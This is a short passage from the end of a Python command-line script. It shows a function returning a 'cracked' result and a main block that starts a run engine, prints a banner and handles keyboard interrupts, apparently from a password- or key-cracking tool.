        send_interrupt(proc)

        return cracked


if __name__ == '__main__':
    RUN_CONFIG = RunConfiguration()
    try:
        banner(RUN_CONFIG)
        engine = RunEngine(RUN_CONFIG)
        engine.Start()
        #main(RUN_CONFIG)
    except KeyboardInterrupt:
        print_red(R + '\n (^C)' + O + ' Interrupted.\n' + W)
    except EOFError:
        print_red(R + '\n (^D)' + O + ' Interrupted.\n' + W)

    RUN_CONFIG.exit_gracefully(0)